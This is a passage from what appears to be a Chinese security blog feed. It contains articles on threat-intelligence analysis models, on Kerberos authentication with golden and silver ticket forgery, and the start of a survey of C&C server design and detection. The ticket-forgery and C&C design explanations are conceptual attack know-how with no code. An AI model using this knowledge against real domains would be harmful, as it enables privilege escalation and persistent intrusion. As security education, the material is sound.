title="1.威胁情报在事件分析中的定位"></a><strong>1.威胁情报在事件分析中的定位</strong></h3><p>威胁情报数据并<strong>不能帮助甲方来预测攻击</strong>，威胁情报在安全运营体系中的定位是——<strong>辅助发现潜在的或正在发起的恶意行为或操作</strong>，重点在于<strong>辅助</strong>两个字，威胁情报严格意义上来说只能<strong>有限地感知潜在的威胁</strong>，换句话说：如果有人现在瞄准的目标全部都是能源类客户，那么威胁情报就可以提醒没有被攻击的客户可能会遭受到该攻击者的攻击，这个叫做有限的感知潜在的威胁。</p><p>威胁情报既然是个辅助手段，那么肯定有一个主要手段，这个主要的手段其实就是<strong>针对事件的分析</strong>，接下来主要说的是两个分析使用的模型——<strong>钻石模型</strong>和<strong>Kill-Chain模型</strong>，这两个模型在分析的时候往往需要结合起来使用，尤其是比较大型的针对性的攻击诸如APT攻击。</p><h3 id="2-Kill-Chain模型"><a href="#2-Kill-Chain模型" class="headerlink" title="2.Kill-Chain模型"></a><strong>2.Kill-Chain模型</strong></h3><p>Kill-Chain模型分为7个部分，侦查阶段（Reconnaissance）、武器化阶段（Weaponization）、部署阶段（Delivery）、攻击阶段（Exploitation）、后门植入阶段（Installation）、远程控制阶段（C&amp;C）、后渗透阶段（Actives on Objects），也就是下面这个样子：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A53.jpg" alt="此处输入图片的描述"></p><ul><li>侦查阶段：扫描目标IT资产和<strong>信息收集</strong>，比如说<a href="https://github.com/K0rz3n/GoogleHacking-Page" target="_blank" rel="noopener">Google Hacking</a>这些侦查类型的攻击</li><li>武器化阶段：将前一阶段发现和扫描到漏洞的信息整合到一起并<strong>制作针对性的武器</strong>（当然国内的嘛，你懂得）</li><li>部署阶段：将这些武器或者是远控RAT<strong>部署</strong>到对应的Compromised Servers上</li><li>攻击阶段：使用这些Compromised Servers和之前做好的武器化工具<strong>对目标发起攻击</strong></li><li>后门种植阶段：<strong>安装远程控制</strong>的服务和进程</li><li>远控阶段：让目标<strong>和C&amp;C通信</strong></li><li>后渗透阶段：收割、继续<strong>横向渗透入侵</strong></li></ul><h3 id="3-钻石模型"><a href="#3-钻石模型" class="headerlink" title="3.钻石模型"></a><strong>3.钻石模型</strong></h3><p>之前说过了<strong>一次完整的攻击行为的参考就是上面说到的Kill-Chain</strong>，也就是用来描述的攻击者攻击的路线和进行的进度。但是Kill-Chain只能说明攻击的进程和路线，并不能很好地<strong>说明其造成的影响和目的</strong>，钻石模型就很好的针对性的补充了这点。</p><p>钻石模型是一个针对<strong>单个事件</strong>分析的模型，核心就是用来描述攻击者的技战术和目的，具体的钻石模型如下图所示：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A54.jpg" alt="此处输入图片的描述"></p><p><strong>总结一下这幅图就是说明：攻击者因为什么原因，利用哪些基础设施，并通哪些手段攻击了怎么样的一个目标</strong></p><p>具体一点的关于图中信息的解释如下：</p><p><strong>社会政治影响：</strong>处于钻石模型上下两个顶点，上顶点表示攻击者，下顶点表示受害者也就是目标。攻击者和受害者之间的某种利益冲突或者是社会地位对立则会产生攻击的意图和发起攻击的原因，纵切面表示的就是社会政治影响。说大白话就是根据这俩人去发现攻击的意图。</p><p><strong>技战术组合：</strong>技战术组合位于整个钻石模型的横切面，横切面的两个顶点分别为基础设施和技术能力，这里的基础设施和技术能力其实都是相对于攻击者而言的。</p><p><strong>元数据：</strong>这个其实就是左边列出来的，攻击时间、攻击阶段、攻击结果、攻击方向、攻击手段、攻击资源利用</p><p><strong>置信度：</strong>也就是以上你分析出结果的可信程度。</p><blockquote><p><strong>注意：</strong></p><p>这里要提醒一点，但凡基于威胁情报做分析的时候一定要牢记以下4点：</p><p>1.威胁情报分析出来的结果一般不能作为电子证据确定嫌疑人有计算机犯罪行为<br>2.威胁情报分析结果须带有严格的置信度<br>3.威胁情报数据由于技术原因限制不可以做到实时性<br>4.要在相关机构的监管下进行分析</p></blockquote><h3 id="4-Kill-Chain与钻石模型的组合分析"><a href="#4-Kill-Chain与钻石模型的组合分析" class="headerlink" title="4.Kill-Chain与钻石模型的组合分析"></a><strong>4.Kill-Chain与钻石模型的组合分析</strong></h3><p>复杂的攻击往往都是有一系列的攻击事件组成的，不同的攻击事件指向的目标和达到的目的可以表示出攻击的进程，那么OK，我们如果把事件按照Kill-Chain进行分类同时使用泳道图进行表示，同时把不同的攻击路线分为不同的攻击线程，那么我们就可以得到一个这样的泳道图。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A55.jpg" alt="此处输入图片的描述"></p><p><strong>其实这张图描述的是这么一个事件：</strong></p><p>1.攻击者先对目标进行了Google Hacking操作，获得了他们域名解析记录等一些基础的It信息<br>2.攻击者找到了一个目标新注册的域名，然后用搜索引擎搜索他们的网络管理员的电子邮件信息<br>3.攻击者使用鱼叉邮件方式对目标的网络管理员发送一封带有木马的邮件<br>4.目标的网管（我们叫他网管一号）打开了这封邮件的附件然后不幸中枪<br>5.网管一号的主机因为中了病毒，所以攻击者利用网管一号这台主机发送了一个HTTP Post请求到域控节点，然后域控节点返回了一个HTTP Response<br>6.我们通过对鱼叉邮件中附件进行逆向分析发现里面有两个IP地址，第二个IP地址作为备份，防止第一个失效<br>7.通过C&amp;C请求到网管一号的主机，我们的恶意程序打开了一个TCP代理服务<br>8.通过网管一号主机上的代理服务，攻击者继续去Google上搜索其他的目标<br>9.攻击者检查网管一号邮件的通信录列表去寻找是否拥有目标二号的通讯方式，结果发现了目标二号的首席科学家的联系方式<br>10.攻击者使用攻陷的网管一号的邮箱对目标二号的首席科学家的邮箱发起鱼叉邮件攻击，工具使用和之前一样的<br>11.此时又来了一个攻击者，我们称他为攻击者二号，攻击者一号扫描了目标三号的web服务器<br>12.使用同样的漏洞利用工具攻击发现目标三号主机上的相同的漏洞<br>13.被攻陷的目标三号主机返回一个shell会话给攻击者三号<br>14.目标三号的所有数据被攻击者三号窃取</p><p>这样的话使用Kill-Chain和钻石模型分析可以同时get到攻击者的点和想要攻击的目标，同时还知道了他的攻击路径，也就是说这时候我们对攻击者了如指掌了。</p><h3 id="5-基于Kill-Chain的安全防护矩阵："><a href="#5-基于Kill-Chain的安全防护矩阵：" class="headerlink" title="5.基于Kill-Chain的安全防护矩阵："></a><strong>5.基于Kill-Chain的安全防护矩阵：</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A56.jpg" alt="此处输入图片的描述"></p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>本文按照网上的资料对威胁情报和 APT 事件的分析方法进行了简单的阐述，丰富了自己对情报分析方面的认知。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/fly_hps/article/details/82744104" target="_blank" rel="noopener">https://blog.csdn.net/fly_hps/article/details/82744104</a><br><a href="https://zhuanlan.zhihu.com/p/30105006" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30105006</a><br><a href="https://zhuanlan.zhihu.com/p/30160133" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30160133</a><br><a href="https://zhuanlan.zhihu.com/p/30197024" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30197024</a><br><a href="https://www.xmanblog.net/threat-intelligence/" target="_blank" rel="noopener">https://www.xmanblog.net/threat-intelligence/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X01-基本信息：&quot;&gt;&lt;a href=&quot;#0X01-基本信息：&quot; class=&quot;headerlink&quot; title=&quot;0X01 基本信息：&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 基本信息：&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-威胁情报的定义：&quot;&gt;&lt;a href=&quot;#1-威胁情报的定义：&quot; class=&quot;headerlink&quot; title=&quot;1.威胁情报的定义：&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.威胁情报的定义：&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;威胁情报是关于IT或信息资产所面临的&lt;strong&gt;现有&lt;/strong&gt;或&lt;strong&gt;潜在&lt;/strong&gt;威胁的循证知识，包括情境、机制、指标、推论与可行建议，这些知识可为威胁响应提供决策依据。&lt;/p&gt;
&lt;h3 id=&quot;2-分类&quot;&gt;&lt;a href=&quot;#2-分类&quot; class=&quot;headerlink&quot; title=&quot;2.分类&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.分类&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;按照不同标准威胁情报有多种不同的分类方式，首先根据数据本身威胁情报可以分&lt;strong&gt;为HASH值&lt;/strong&gt;、&lt;strong&gt;IP地址&lt;/strong&gt;、&lt;strong&gt;域名&lt;/strong&gt;、&lt;strong&gt;网络或主机特征&lt;/strong&gt;、&lt;strong&gt;TTPs（Tactics、Techniques &amp;amp; Procedures）&lt;/strong&gt;这几种，其源于David J. Bianco在《The Pyramid of Pain》一文中提出的威胁情报相关指标（单一的信息或数据一般算不上威胁情报，经过分析处理过的有价值的信息才称得上威胁情报）的金字塔模型。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A52.png&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="APT" scheme="https://www.k0rz3n.com/categories/APT/"/>
    
    
      <category term="APT" scheme="https://www.k0rz3n.com/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>浅析 Kerberos 认证过程以及黄金票据和白银票据</title>
    <link href="https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
    <id>https://www.k0rz3n.com/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/</id>
    <published>2019-03-17T13:55:18.000Z</published>
    <updated>2019-04-28T14:10:32.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>玩 Windows 域渗透的时候经常会听到的就是黄金票据和白银票据的利用了(虽然比较老的技术，但是始终是强力的武器)。这两个概念是在 kerberos 的认证过程中出现的，咱们先不谈利用，就是从理解整个流程上看也是比较困难的，因为kerberos 的认证过程确实是比较复杂的，不仅记不住，而且可能看了又看最后还没找到整个过程中哪个是黄金票据哪个又是白银票据，我个人也是这样，于是才有了这篇文章。</p><h2 id="0X01-Windows-的认证协议"><a href="#0X01-Windows-的认证协议" class="headerlink" title="0X01 Windows 的认证协议"></a><strong>0X01 Windows 的认证协议</strong></h2><p>Windows 的认证协议主要有两种，一种是 NTLM 另一种是 Kerberos </p><h3 id="1-NTLM"><a href="#1-NTLM" class="headerlink" title="1.NTLM"></a><strong>1.NTLM</strong></h3><p>NTLM 的认证机制是一种基于挑战、应答的Windows 早期的认证机制，因为其安全性不高，于是从 Windows 2000  开始已经默认不再使用，而是使用了 Kerberos 其作为域的默认认证协议，因为和本文关系不大，所以这里就不详细介绍了。</p><h3 id="2-Kerberos"><a href="#2-Kerberos" class="headerlink" title="2.Kerberos"></a><strong>2.Kerberos</strong></h3><p>相对于ntlm而言,kerberos的认证方式就要复杂的多,因为它提供了一个<strong>集中式</strong>的认证方式,在整个认证过程中总共要涉及到三方:客户端、服务端和KDC(Kerberos起源于希腊神话，是一支守护着冥界长着3个头颅的神犬，在keberos Authentication中，Kerberos的3个头颅代表中认证过程中涉及的3方),<strong>在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任</strong>,Kerberos是一种<strong>基于票据的认证方式</strong>,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,<strong>Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</strong></p><p><strong>下图是 Kerberos 的认证过程示意图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B1.png" alt="此处输入图片的描述"></p><a id="more"></a><blockquote><p><strong>注：这里面涉及到的一些名词缩写</strong></p><ul><li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li><li>AS(Authentication Server):身份认证服务</li><li>TGS(Ticket Granting Server):票据授予服务,<strong>该服务提供的票据也称为 TGS 或者叫白银票据</strong></li><li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据<strong>(黄金票据)</strong>，用于身份认证，存储在内存，默认有效期为10小时</li></ul></blockquote><h2 id="0X02-分析开始"><a href="#0X02-分析开始" class="headerlink" title="0X02 分析开始"></a><strong>0X02 分析开始</strong></h2><p>认证的核心目的就是让通信双方确认对方的真实身份，那么如果一个客户端要和一个服务器端通信，该怎么认证呢？我们现在一步步开始分析</p><h3 id="1-初步思考共享密钥模式"><a href="#1-初步思考共享密钥模式" class="headerlink" title="1.初步思考共享密钥模式"></a><strong>1.初步思考共享密钥模式</strong></h3><p>首先我们想客户端可以把自己的身份信息，以及通过双方共享的密钥加密后的身份信息打包一起发给服务器，然后服务器通过与客户端共享的密钥解密，再和传过来的明文的身份信息比对来确认客户端的身份。</p><p>看上去很不错，但是你有没有想过<strong>他们是怎么共享这个密钥的呢？</strong>那这个时候密钥分配中心 KDC 这个角色(KDC往往由 DC 充当，并且有着所有客户端和服务器的 <strong>master key–&gt;也就是密码对应的 Hash值</strong> )就要排上用场了(而且这个共享秘钥还不能是简单的使用客户端密码的 hash 值这种长时间不变的值，因为长时间不变的值就给了攻击者足够的时间去破译)</p><h3 id="2-KDC-作为可信第三方分配共享密钥Skey1"><a href="#2-KDC-作为可信第三方分配共享密钥Skey1" class="headerlink" title="2.KDC 作为可信第三方分配共享密钥Skey1"></a><strong>2.KDC 作为可信第三方分配共享密钥Skey1</strong></h3><p>KDC 可以在客户端请求与服务器通信的临时密钥 Skey1 的时候，根据客户端提供的通信双方的身份信息从数据库中找到他们各自的 master key 然后分别加密两份 Skey1 ，一份给客户端，另一份给服务器端(发送给服务器端的内容除了 Skey1 以外还有 客户端的身份信息，用来待会客户端与服务器端通信时进行确认身份，<strong>其实Skey1和客户端身份信息合起来就是后面将会说的 TGS 也就是白银票据，可见白银票据是使用 服务器端的 master key加密的，是针对某个具体的服务器的，虽然伪造可以跳过 KDC 的认证，但是其影响面相对较小</strong>)，然后为了免于服务器端维护一个客户端和 Skey1 对应列表的负担，这两个信息都会先发送给客户端保存。</p><p>然后客户端通过自己的 master key 解密自己的那份信息(如果客户端是伪造的，不知道自己的 master key 则无法解密 KDC 发过来的信息)，然后用解密出来的 Skey1 加密自己的身份信息和一个时间戳(防止重放)，连同之前从KDC 得到的本来应该给服务器的那个用服务器端的 master key 加密的信息(TGS 白银票据)一同发送给服务器端，服务器端用自己的 master key 解密属于自己的那份信息(TGS 白银票据)，得到了 Skey1 和 客户端的身份信息，然后再用 Skey1 解密客户端发来的身份信息(这时候要校验时间戳是不是在可接受的范围内)，两者对比一下，从而认定客户端的身份。</p><p>我们发现，上面的步骤已经是的客户端和服务器端的认证过程使用了 Skey1 这个有短期时效的共享密钥，这样的话下一次想要通信的的时候只要该密钥没有过期就能免于之前的 KDC 重新生成一个 Skey1的繁琐步骤。但是你会发现客户端和 KDC 之间也是有类似客户端和服务器的身份认证过程，但是他们两个之间共享的唯一的密钥就是客户端的 master key 这个长期值(我们之前说过长期不变的值是不能作为共享密钥使用的，这会给了攻击者攻破的机会)，而客户端和 KDC 的认证过程又是非常重要的，因为这个过程负责传递给客户端 TGS(白银票据)，这也是整个身份认证的关键，所以我们还的想一个办法解决，从而让客户端和 KDC 之间的身份认证也用一个 短期密钥 Skey2 实现。</p><h3 id="3-TGT-出现解决客户端与-KDC-的密钥共享问题"><a href="#3-TGT-出现解决客户端与-KDC-的密钥共享问题" class="headerlink" title="3.TGT 出现解决客户端与 KDC 的密钥共享问题"></a><strong>3.TGT 出现解决客户端与 KDC 的密钥共享问题</strong></h3><p>介绍这节之前先要说一下 KDC 的 AS 和 TGS，其实 KDC 就分成这两个部分，见下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B2.png" alt="此处输入图片的描述"></p><p><strong>客户端将会从 AS 中获取 TGT(黄金票据) ，然后从 TGS 中获取 TGS(白银票据)</strong> </p><p>为了解决上一节提到的问题，TGT 出现了，客户端从 KDC 的 AS 获取这个票据以后，客户端就能向 KDC 的 TGS 申请 TGS(Skey1+客户端身份信息) 票据(这个票据是客户端用于向服务器申请与服务器进行通信的票据，详情请见上一节)</p><p>客户端向 KDC 的 AS 申请 TGT(这里客户端首先要用自的 master key 加密自己的身份信息和 KDC 的信息，这样是为了让 KDC 知道客户端是真的知道自己的 master key ，而不是随便一个人的请求) 后，KDC 的 AS 会生成一个短期共享密钥 Skey2 ，然后分别用客户端和 KDC 的 mastet key(<strong>实际上这个 master key 就是 krbtgt 的 hash</strong> ) 进行加密(用 KDC master key 加密的除了 Skey2 以外还有客户端的身份信息，<strong>其实这两个被加密的信息合起来就是 TGT ，也就是我们常常说的黄金票据，可见，这个票据是针对 KDC 的，而没有指定服务器，因此影响范围较大</strong>)，然后一并发送给客户端。</p><p>客户端用自己的 master key 解密获取到 Skey2 ，然后用这个Skey2对客户端的身份信息以及想要访问的服务器的身份进行加密，连同刚刚获取的用 KDC 的 master key(krbtgt 的 hash )加密的数据一同发送到 KDC 的 TGS ，从而请求获取 TGS 票据，KDC 通过自己的 master key(krbtgt 的 hash) 解密数据，得到 Skey2 和客户端的身份，再通过 Skey2 解密客户端发来的另一个消息，确认客户端的身份，并且还能得到客户端想要访问的服务器，这样我们就又进入了我们之前讲过的第一步 <strong>“KDC 作为可信第三方分配共享密钥Skey1”</strong></p><h2 id="0X03-伪造票据的利用方法"><a href="#0X03-伪造票据的利用方法" class="headerlink" title="0X03 伪造票据的利用方法"></a><strong>0X03 伪造票据的利用方法</strong></h2><p>上一节中详细介绍了 Kerberos 的认证过程，并且指明了认证过程中的 TGT 就是所谓的黄金票据， TGS 就是所谓的白银票据，那么我们在攻击中该怎么利用呢？这是我们这一小节的内容</p><h3 id="1-黄金票据-Golden-Ticket"><a href="#1-黄金票据-Golden-Ticket" class="headerlink" title="1.黄金票据(Golden Ticket)"></a><strong>1.黄金票据(Golden Ticket)</strong></h3><p>先假设这么一种情况,原先已拿到的域内所有的账户hash,包括krbtgt这个账户,由于有些原因导致域管权限丢失,但好在你还有一个普通域用户权限,碰巧管理员在域内加固时忘记重置krbtgt密码,基于此条件,我们还能利用该票据重新获得域管理员权限,利用krbtgt的HASH值可以伪造生成任意的TGT(使用 mimikatz),能够绕过对任意用户的账号策略,让用户成为任意组的成员,可用于Kerberos认证的任何服务(如果你看到这里还是不理解为什么有了 krbtgt hash 就能伪造一切，请回到上面再仔细地分析一下整个流程)</p><h3 id="2-白银票据-Silver-Ticket"><a href="#2-白银票据-Silver-Ticket" class="headerlink" title="2.白银票据(Silver Ticket)"></a><strong>2.白银票据(Silver Ticket)</strong></h3><p>通过观察Kerberos协议的认证过程不难发现,如果我们获取了服务器端的 master key ,就可以伪造 TGS 从而跳过KDC的认证，直接和目标Server通信</p><h2 id="0X04-关于黄金票据和白银票据的一些区别"><a href="#0X04-关于黄金票据和白银票据的一些区别" class="headerlink" title="0X04 关于黄金票据和白银票据的一些区别:"></a><strong>0X04 关于黄金票据和白银票据的一些区别:</strong></h2><h3 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a><strong>1.访问权限不同</strong></h3><p>(1)Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>(2)Silver Ticket: 伪造TGS,只能访问指定的服务</p><h3 id="2-加密方式不同"><a href="#2-加密方式不同" class="headerlink" title="2.加密方式不同"></a><strong>2.加密方式不同</strong></h3><p>(1)Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>(2)Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</p><h3 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a><strong>3.认证流程不同</strong></h3><p>(1)Golden Ticket 的利用过程需要访问域控(KDC)<br>(2)Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</p><h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a><strong>0X05 总结</strong></h2><p>本文简单的梳理了一下 Kerberos 的认证过程(可能需要一点密码学的基本知识)，虽然没有配图，不过我觉得我讲的条例还算清晰，至少我是把我自己给说懂了,hhh，图以后有时间再一点点配吧。</p><h2 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a><strong>0X07 参考链接</strong></h2><p><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">https://blog.csdn.net/wulantian/article/details/42418231</a><br><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="noopener">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</a><br><a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">https://adsecurity.org/?p=1515</a><br><a href="http://www.mottoin.com/tech/119164.html" target="_blank" rel="noopener">http://www.mottoin.com/tech/119164.html</a><br><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">https://adsecurity.org/?p=1640</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;玩 Windows 域渗透的时候经常会听到的就是黄金票据和白银票据的利用了(虽然比较老的技术，但是始终是强力的武器)。这两个概念是在 kerberos 的认证过程中出现的，咱们先不谈利用，就是从理解整个流程上看也是比较困难的，因为kerberos 的认证过程确实是比较复杂的，不仅记不住，而且可能看了又看最后还没找到整个过程中哪个是黄金票据哪个又是白银票据，我个人也是这样，于是才有了这篇文章。&lt;/p&gt;
&lt;h2 id=&quot;0X01-Windows-的认证协议&quot;&gt;&lt;a href=&quot;#0X01-Windows-的认证协议&quot; class=&quot;headerlink&quot; title=&quot;0X01 Windows 的认证协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 Windows 的认证协议&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Windows 的认证协议主要有两种，一种是 NTLM 另一种是 Kerberos &lt;/p&gt;
&lt;h3 id=&quot;1-NTLM&quot;&gt;&lt;a href=&quot;#1-NTLM&quot; class=&quot;headerlink&quot; title=&quot;1.NTLM&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.NTLM&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;NTLM 的认证机制是一种基于挑战、应答的Windows 早期的认证机制，因为其安全性不高，于是从 Windows 2000  开始已经默认不再使用，而是使用了 Kerberos 其作为域的默认认证协议，因为和本文关系不大，所以这里就不详细介绍了。&lt;/p&gt;
&lt;h3 id=&quot;2-Kerberos&quot;&gt;&lt;a href=&quot;#2-Kerberos&quot; class=&quot;headerlink&quot; title=&quot;2.Kerberos&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.Kerberos&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;相对于ntlm而言,kerberos的认证方式就要复杂的多,因为它提供了一个&lt;strong&gt;集中式&lt;/strong&gt;的认证方式,在整个认证过程中总共要涉及到三方:客户端、服务端和KDC(Kerberos起源于希腊神话，是一支守护着冥界长着3个头颅的神犬，在keberos Authentication中，Kerberos的3个头颅代表中认证过程中涉及的3方),&lt;strong&gt;在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任&lt;/strong&gt;,Kerberos是一种&lt;strong&gt;基于票据的认证方式&lt;/strong&gt;,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,&lt;strong&gt;Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下图是 Kerberos 的认证过程示意图：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B1.png&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Kerberos" scheme="https://www.k0rz3n.com/categories/Kerberos/"/>
    
    
      <category term="域渗透" scheme="https://www.k0rz3n.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>C&amp;C控制服务的设计和侦测方法综述(Drops from wooyun)</title>
    <link href="https://www.k0rz3n.com/2019/03/13/C&amp;C%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E4%BE%A6%E6%B5%8B%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0(Drops%20from%20wooyun)/"/>
    <id>https://www.k0rz3n.com/2019/03/13/C&amp;C控制服务的设计和侦测方法综述(Drops from wooyun)/</id>
    <published>2019-03-13T11:28:18.000Z</published>
    <updated>2019-04-28T13:56:53.861Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章总结了一些我在安全工作里见到过的千奇百怪的C&amp;C控制服务器的设计方法以及对应的侦测方法，在每个C&amp;C控制服务先介绍黑帽部分即针对不同目的的C&amp;C服务器设计方法，再介绍白帽部分即相关侦测办法，大家来感受一下西方的那一套。这里的白帽部分有一部分侦测方法需要一些数据和统计知识，我也顺便从原理上简单讨论了一下用数据进行安全分析的方法，从数学和数据原理上思考为什么这么做，可以当作数据科学在安全领域的一些例子学习一下。</p><h2 id="0x00-什么是C-amp-C服务器"><a href="#0x00-什么是C-amp-C服务器" class="headerlink" title="0x00 什么是C&amp;C服务器"></a><strong>0x00 什么是C&amp;C服务器</strong></h2><p>C&amp;C服务器(又称CNC服务器)也就是 Command &amp; Control Server，<strong>一般是指挥控制僵尸网络botnet的主控服务器</strong>，用来和僵尸网络的每个感染了恶意软件(malware)的宿主机进行通讯并<strong>指挥它们的攻击行为</strong>。每个malware的实例通过和它的C&amp;C服务器通讯获得指令进行攻击活动，包括获取DDoS攻击开始的时间和目标，上传从宿主机偷窃的到的信息，定时给感染机文件加密勒索等。</p><a id="more"></a><p>为什么malware需要主动和C&amp;C服务通讯?因为多数情况下malware是通过钓鱼邮件啊等方法下载到感染宿主机，攻击者并不能主动得知malware被谁下载，也不能主动得知宿主机的状态(是否开机是否联网等)，除非malware主动告诉他，<strong>所以malware都会内置一套寻找C&amp;C主控服务器的方法以保持和C&amp;C的联络和断线重连</strong>。C&amp;C控制服务的攻防要点在于，<strong>攻击者能不能欺骗防御者成功隐藏C&amp;C服务</strong>：如果防御者侦测到了隐藏的C&amp;C服务，通过一些技术(封禁域名和IP等)或者非技术手段(汇报给安全应急中心等)切断malware和C&amp;C之间的联系，就可以有效的摧毁botnet。</p><p>寻找到C&amp;C之后malware和C&amp;C之间的通讯方式并不是本文攻防重点，它可以是SSH文件传输也可以是简单的HTTP GET和POST，技巧性不是很大，不多的几个靠传输来隐藏的技巧比如用DNS隧道隐藏流量这类方法如果有需要以后再来一发详细阐述。</p><h2 id="0X01-IP地址：难度低，易被抓"><a href="#0X01-IP地址：难度低，易被抓" class="headerlink" title="0X01 IP地址：难度低，易被抓"></a><strong>0X01 IP地址：难度低，易被抓</strong></h2><p>这是最常见的一类C&amp;C服务器。攻击者在恶意软件的代码里<strong>硬编码写上C&amp;C服务器的IP地址</strong>，然后在需要和C&amp;C通讯的时候用HTTP拉取需要的攻击指令或者上传从宿主感染机上盗取的信息等等。</p><p>这并不是一个高级的办法，因为如果malware的二进制代码被获取，<strong>这种用IP的方法很容易被安全人员通过反向工程二进制代码或者检测蜜罐流量得到C&amp;C服务器的地址</strong>，从而汇报给服务提供商封禁IP。所以这种方法并不能有效隐藏C&amp;C服务，IP被抓了被反毒软件更新病毒库以后整个botnet就被摧毁了。现在国内的多数malware的主控服务器都是以这种拼运气不被抓的方式存在，他们靠的是malware数量多，今天抓一个当天就再出来三个，市场竞争很激烈。</p><p>国外用IP的C&amp;C服务器一般是在Amazon 